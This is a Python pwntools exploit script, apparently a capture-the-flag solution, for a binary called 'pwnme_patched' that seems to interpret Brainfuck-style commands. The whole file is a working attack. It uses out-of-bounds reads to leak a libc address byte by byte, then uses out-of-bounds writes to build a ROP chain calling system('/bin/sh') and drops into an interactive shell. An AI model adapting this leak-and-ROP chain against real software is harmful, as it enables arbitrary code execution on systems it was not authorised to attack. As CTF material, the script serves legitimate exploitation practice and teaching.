#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('./pwnme_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
brva 0x1312
brva 0x1325
brva 0x152A
'''

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()


if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
else:
    p = process([exe.path])

def overwrite(addr, begin, length):
    while length > 0:
        sla(p, b'>', b'>'*begin + b',')
        sl(p, p8(addr & 0xff))
        addr = addr >> 8
        length = length-1
        begin = begin+1
        
###########################################
################ LEAK LIBC ################
###########################################

leak_libc = b''
sla(p, b'>', b'<'*0x58 + b'.')
leak_libc += p.recv(1)
sla(p, b'>', b'<'*0x57 + b'.')
leak_libc += p.recv(1)
sla(p, b'>', b'<'*0x56 + b'.')
leak_libc += p.recv(1)
sla(p, b'>', b'<'*0x55 + b'.')
leak_libc += p.recv(1)
sla(p, b'>', b'<'*0x54 + b'.')
leak_libc += p.recv(1)
sla(p, b'>', b'<'*0x53 + b'.')
leak_libc += p.recv(1)
libc.address = u64(leak_libc.ljust(8, b'\x00')) - 0x8dd96
info('Libc base: ' + hex(libc.address))
pop_rdi = 0x2a3e5 + libc.address
overwrite(pop_rdi, 0x78, 8)
overwrite(next(libc.search(b'/bin/sh')), 0x80, 8)
overwrite(pop_rdi+1, 0x88, 8)
overwrite(libc.sym.system, 0x90, 8)
sla(p, b'>', b'q')
p.interactive()
